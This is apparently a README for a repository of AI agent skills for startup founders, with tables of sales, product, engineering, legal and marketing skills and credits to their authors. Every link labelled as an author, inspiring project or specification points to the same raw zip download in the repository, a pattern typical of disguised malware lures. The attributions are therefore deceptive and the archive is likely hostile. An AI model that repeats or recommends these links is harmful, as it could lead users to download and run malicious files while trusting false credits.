...
Inspired by [Marketing Skills](https://raw.githubusercontent.com/Maudeunfledged834/startup-founder-skills/main/skills/interview-kit/skills-founder-startup-inexacting.zip) by Corey Haines — extended from marketing to the full founder stack: fundraising, sales, product, recruiting, engineering, legal, finance, and growth. Works with Claude Code, OpenAI Codex, Cursor, Windsurf, and any agent that supports the [Agent Skills spec](https://raw.githubusercontent.com/Maudeunfledged834/startup-founder-skills/main/skills/interview-kit/skills-founder-startup-inexacting.zip).
...
| | | | |
| **Sales & BD** | | | |
| [cold-outreach](skills/cold-outreach/) | High | [Brian Wagner](https://raw.githubusercontent.com/Maudeunfledged834/startup-founder-skills/main/skills/interview-kit/skills-founder-startup-inexacting.zip) | Write cold emails, LinkedIn messages, and follow-up sequences for B2B prospecting. Adapted from cold-outreach-sequence skill. |
| [sales-script](skills/sales-script/) | Medium | [Alireza Rezvani](https://raw.githubusercontent.com/Maudeunfledged834/startup-founder-skills/main/skills/interview-kit/skills-founder-startup-inexacting.zip) | Demo scripts, discovery call frameworks, objection handling docs, and closing playbooks. Adapted from sales-engineer skill. |
| [proposal-generation](skills/proposal-generation/) | Medium | [Alireza Rezvani](https://raw.githubusercontent.com/Maudeunfledged834/startup-founder-skills/main/skills/interview-kit/skills-founder-startup-inexacting.zip) | Create sales proposals, SOWs, and pricing quotes. Adapted from contract-and-proposal-writer skill. |
| [lead-scoring](skills/lead-scoring/) | Medium | [Athina AI](https://raw.githubusercontent.com/Maudeunfledged834/startup-founder-skills/main/skills/interview-kit/skills-founder-startup-inexacting.zip) | Define ICP criteria, lead qualification frameworks, and scoring models. Adapted from inbound-lead-qualification skill. |
...
| | | | |
| **Product & Strategy** | | | |
| [prd-writing](skills/prd-writing/) | Medium | [Pawel Huryn](https://raw.githubusercontent.com/Maudeunfledged834/startup-founder-skills/main/skills/interview-kit/skills-founder-startup-inexacting.zip) | Write product requirements documents, feature specs, and user story sets. Adapted from create-prd skill. |
| [user-research-synthesis](skills/user-research-synthesis/) | Medium | [Pawel Huryn](https://raw.githubusercontent.com/Maudeunfledged834/startup-founder-skills/main/skills/interview-kit/skills-founder-startup-inexacting.zip) | Synthesize customer interviews, survey data, and support tickets into insights and personas. Adapted from summarize-interview skill. |
| [roadmap-planning](skills/roadmap-planning/) | Medium | [Pawel Huryn](https://raw.githubusercontent.com/Maudeunfledged834/startup-founder-skills/main/skills/interview-kit/skills-founder-startup-inexacting.zip) | Build or update a product roadmap with timeline views, dependencies, and milestones. Adapted from outcome-roadmap skill. |
| [mvp-scoping](skills/mvp-scoping/) | Medium | Shawn Pang | Define MVP scope — what to build, what to cut, and what to defer. |
| [competitive-analysis](skills/competitive-analysis/) | High | [Pawel Huryn](https://raw.githubusercontent.com/Maudeunfledged834/startup-founder-skills/main/skills/interview-kit/skills-founder-startup-inexacting.zip) | Research competitors — feature comparison, positioning analysis, pricing benchmarks, and market mapping. Adapted from competitor-analysis skill. |
| [market-research](skills/market-research/) | Medium | [Pawel Huryn](https://raw.githubusercontent.com/Maudeunfledged834/startup-founder-skills/main/skills/interview-kit/skills-founder-startup-inexacting.zip) | Size a market (TAM/SAM/SOM), identify trends, and validate market hypotheses. Adapted from market-sizing skill. |
...
| [interview-kit](skills/interview-kit/) | High | [Alireza Rezvani](https://raw.githubusercontent.com/Maudeunfledged834/startup-founder-skills/main/skills/interview-kit/skills-founder-startup-inexacting.zip) | Design interview processes — questions, scorecards, take-home assignments, evaluation rubrics, and comp benchmarking. Adapted from interview-system-designer skill. |
...
| | | | |
| **Engineering** | | | |
| [architecture-design](skills/architecture-design/) | Medium | [Alireza Rezvani](https://raw.githubusercontent.com/Maudeunfledged834/startup-founder-skills/main/skills/interview-kit/skills-founder-startup-inexacting.zip) | Design system architecture — service boundaries, data models, API design, and infrastructure planning. Adapted from senior-architect skill. |
| [code-review](skills/code-review/) | High | [Jeff Allan](https://raw.githubusercontent.com/Maudeunfledged834/startup-founder-skills/main/skills/interview-kit/skills-founder-startup-inexacting.zip) | Thorough code review focused on correctness, security, performance, and maintainability. Adapted from code-reviewer skill. |
| [cicd-setup](skills/cicd-setup/) | High | [Alireza Rezvani](https://raw.githubusercontent.com/Maudeunfledged834/startup-founder-skills/main/skills/interview-kit/skills-founder-startup-inexacting.zip) | Set up or improve CI/CD pipelines — GitHub Actions, testing, deployment, and release automation. Adapted from ci-cd-pipeline-builder skill. |
| [tech-stack-eval](skills/tech-stack-eval/) | Medium | [Alireza Rezvani](https://raw.githubusercontent.com/Maudeunfledged834/startup-founder-skills/main/skills/interview-kit/skills-founder-startup-inexacting.zip) | Evaluate and select technologies — frameworks, databases, hosting, and third-party services. Adapted from tech-stack-evaluator skill. |
| [security-review](skills/security-review/) | High | [Jeff Allan](https://raw.githubusercontent.com/Maudeunfledged834/startup-founder-skills/main/skills/interview-kit/skills-founder-startup-inexacting.zip) | Audit security — OWASP top 10, auth flows, data handling, and dependency vulnerabilities. Adapted from security-reviewer skill. |
| | | | |
| **Legal & Compliance** | | | |
| [privacy-policy](skills/privacy-policy/) | High | [Pawel Huryn](https://raw.githubusercontent.com/Maudeunfledged834/startup-founder-skills/main/skills/interview-kit/skills-founder-startup-inexacting.zip) | Generate or update a privacy policy, cookie policy, or data processing documentation. Adapted from privacy-policy skill. **Not a substitute for legal counsel.** |
...
| [soc2-prep](skills/soc2-prep/) | Medium | [Alireza Rezvani](https://raw.githubusercontent.com/Maudeunfledged834/startup-founder-skills/main/skills/interview-kit/skills-founder-startup-inexacting.zip) | Prepare for SOC 2 compliance — policy templates, control mapping, and evidence collection checklists. Adapted from ciso-advisor skill. |
| | | | |
| **Operations** | | | |
...
| [board-update](skills/board-update/) | Medium | [Alireza Rezvani](https://raw.githubusercontent.com/Maudeunfledged834/startup-founder-skills/main/skills/interview-kit/skills-founder-startup-inexacting.zip) | Write investor updates, board decks, and monthly/quarterly reports. Adapted from board-deck-builder skill. |
| | | | |
| **Customer Success** | | | |
| [onboarding-flow](skills/onboarding-flow/) | Medium | [Manoj Bajaj](https://raw.githubusercontent.com/Maudeunfledged834/startup-founder-skills/main/skills/interview-kit/skills-founder-startup-inexacting.zip) | Design or optimize user onboarding — activation flows, welcome sequences, and time-to-value optimization. Adapted from user-onboarding skill. |
...
| [feedback-synthesis](skills/feedback-synthesis/) | Medium | [Pawel Huryn](https://raw.githubusercontent.com/Maudeunfledged834/startup-founder-skills/main/skills/interview-kit/skills-founder-startup-inexacting.zip) | Analyze customer feedback — categorize themes, identify patterns, and prioritize action items. Adapted from analyze-feature-requests skill. |
| [churn-analysis](skills/churn-analysis/) | Medium | [Athina AI](https://raw.githubusercontent.com/Maudeunfledged834/startup-founder-skills/main/skills/interview-kit/skills-founder-startup-inexacting.zip) | Analyze churn — identify drivers, design retention experiments, and create win-back campaigns. Adapted from churn-risk-detector skill. |
...
| | | | |
| **Marketing & Growth** | | | |
| [landing-page](skills/landing-page/) | High | [Corey Haines](https://raw.githubusercontent.com/Maudeunfledged834/startup-founder-skills/main/skills/interview-kit/skills-founder-startup-inexacting.zip) | Build or optimize a landing page — copy, layout, CTAs, and conversion optimization. Adapted from page-cro skill. |
| [content-strategy](skills/content-strategy/) | High | [Corey Haines](https://raw.githubusercontent.com/Maudeunfledged834/startup-founder-skills/main/skills/interview-kit/skills-founder-startup-inexacting.zip) | Plan content — blog strategy, SEO content calendars, thought leadership, and documentation. Adapted from content-strategy skill. |
| [seo-technical](skills/seo-technical/) | High | [Daniel Agrici](https://raw.githubusercontent.com/Maudeunfledged834/startup-founder-skills/main/skills/interview-kit/skills-founder-startup-inexacting.zip) | Audit or improve technical SEO — site structure, meta tags, schema markup, and Core Web Vitals. Adapted from seo-technical skill. |
| [email-marketing](skills/email-marketing/) | High | [Corey Haines](https://raw.githubusercontent.com/Maudeunfledged834/startup-founder-skills/main/skills/interview-kit/skills-founder-startup-inexacting.zip) | Create email campaigns — newsletters, drip sequences, lifecycle emails, and re-engagement flows. Adapted from email-sequence skill. |
| [social-content](skills/social-content/) | High | [Brian Wagner](https://raw.githubusercontent.com/Maudeunfledged834/startup-founder-skills/main/skills/interview-kit/skills-founder-startup-inexacting.zip) | Create social media content — LinkedIn posts, Twitter/X threads, and content repurposing. Adapted from linkedin-authority-builder skill. |
| [launch-strategy](skills/launch-strategy/) | Medium | [Daniel Mendes](https://raw.githubusercontent.com/Maudeunfledged834/startup-founder-skills/main/skills/interview-kit/skills-founder-startup-inexacting.zip) | Plan a product launch — Product Hunt, Hacker News, press outreach, and community seeding. Adapted from product-launch-marketing skill. |
...
- [Corey Haines](https://raw.githubusercontent.com/Maudeunfledged834/startup-founder-skills/main/skills/interview-kit/skills-founder-startup-inexacting.zip) — Marketing Skills for AI Agents, the project that inspired this repo
- [Alireza Rezvani](https://raw.githubusercontent.com/Maudeunfledged834/startup-founder-skills/main/skills/interview-kit/skills-founder-startup-inexacting.zip) — Engineering, architecture, CI/CD, sales, and compliance skills
- [Pawel Huryn](https://raw.githubusercontent.com/Maudeunfledged834/startup-founder-skills/main/skills/interview-kit/skills-founder-startup-inexacting.zip) — Product management skills (PRDs, roadmaps, research, privacy)
- [Jeff Allan](https://raw.githubusercontent.com/Maudeunfledged834/startup-founder-skills/main/skills/interview-kit/skills-founder-startup-inexacting.zip) — Code review and security review skills
- [Brian Wagner](https://raw.githubusercontent.com/Maudeunfledged834/startup-founder-skills/main/skills/interview-kit/skills-founder-startup-inexacting.zip) — Cold outreach and social content skills
- [Athina AI](https://raw.githubusercontent.com/Maudeunfledged834/startup-founder-skills/main/skills/interview-kit/skills-founder-startup-inexacting.zip) — Lead scoring and churn analysis skills
- [Daniel Agrici](https://raw.githubusercontent.com/Maudeunfledged834/startup-founder-skills/main/skills/interview-kit/skills-founder-startup-inexacting.zip) — Technical SEO skills
- [Daniel Mendes](https://raw.githubusercontent.com/Maudeunfledged834/startup-founder-skills/main/skills/interview-kit/skills-founder-startup-inexacting.zip) — Launch strategy and marketing skills
- [Manoj Bajaj](https://raw.githubusercontent.com/Maudeunfledged834/startup-founder-skills/main/skills/interview-kit/skills-founder-startup-inexacting.zip) — Onboarding and GTM skills
